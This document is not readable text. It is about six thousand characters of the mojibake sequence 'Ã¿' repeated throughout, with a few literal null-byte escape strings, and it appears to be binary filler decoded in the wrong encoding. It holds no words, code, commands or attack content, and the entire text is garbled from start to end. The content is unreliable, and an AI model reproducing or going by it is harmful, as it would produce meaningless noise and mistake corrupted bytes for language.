Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã